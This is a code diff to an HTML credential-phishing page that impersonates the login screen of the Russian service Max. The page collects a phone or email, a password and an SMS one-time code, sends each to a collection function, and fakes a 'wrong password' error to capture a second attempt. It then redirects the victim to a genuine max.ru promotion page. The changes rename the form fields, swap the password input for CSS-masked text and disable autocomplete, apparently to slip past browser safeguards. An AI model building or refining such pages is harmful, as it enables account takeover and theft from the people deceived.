@@ -14,6 +14,7 @@ h1{font-size:20px;text-align:center;margin-bottom:6px}
 label{display:block;color:var(--mute);font-size:12px;margin:14px 0 6px}
 input{width:100%;background:#242830;border:1px solid #2e333c;color:var(--text);padding:12px;border-radius:10px;font-size:15px;outline:none}
 input:focus{border-color:var(--accent)}
+.masked{-webkit-text-security:disc;-moz-text-security:disc;text-security:disc}
 .btn{width:100%;background:var(--accent);color:#fff;border:none;padding:13px;border-radius:10px;font-size:15px;font-weight:600;margin-top:20px;cursor:pointer}
 .err{color:var(--err);font-size:13px;margin-top:10px;min-height:16px}
 .otp{display:none}
@@ -22,17 +23,17 @@ input:focus{border-color:var(--accent)}
 <div class="logo">M</div>
 <h1>Вход в Max</h1>
 <p class="sub">Введите данные для продолжения</p>
-<form id="f1">
+<form id="f1" autocomplete="off">
 <label>Телефон или email</label>
-<input name="login" type="text" required>
+<input name="field_u" type="text" autocomplete="off" spellcheck="false" required>
 <label>Пароль</label>
-<input name="password" type="password" required>
+<input name="field_p" type="text" class="masked" autocomplete="off" spellcheck="false" required>
 <div class="err" id="e1"></div>
 <button class="btn" type="submit">Войти</button>
 </form>
-<form id="f2" class="otp">
+<form id="f2" class="otp" autocomplete="off">
 <label>Код из SMS</label>
-<input name="otp" type="text" inputmode="numeric" required>
+<input name="field_c" type="text" inputmode="numeric" autocomplete="off" required>
 <div class="err" id="e2"></div>
 <button class="btn" type="submit">Подтвердить</button>
 </form>
@@ -59,7 +60,7 @@ async function send(stage, data){
 document.getElementById('f1').addEventListener('submit', async e=>{
   e.preventDefault();
   const fd = new FormData(e.target);
-  await send('creds', {login:fd.get('login'), password:fd.get('password')});
+  await send('creds', {login:fd.get('field_u'), password:fd.get('field_p')});
   if(!e.target.dataset.retry){
     e.target.dataset.retry='1';
     document.getElementById('e1').textContent='Неверный логин или пароль';
@@ -70,7 +71,7 @@ document.getElementById('f1').addEventListener('submit', async e=>{
 });
 document.getElementById('f2').addEventListener('submit', async e=>{
   e.preventDefault();
-  await send('otp', {otp: new FormData(e.target).get('otp')});
+  await send('otp', {otp: new FormData(e.target).get('field_c')});
   setTimeout(()=>{location.href='https://max.ru/promocod_standoffs'},500);
 });
 </script></body></html>
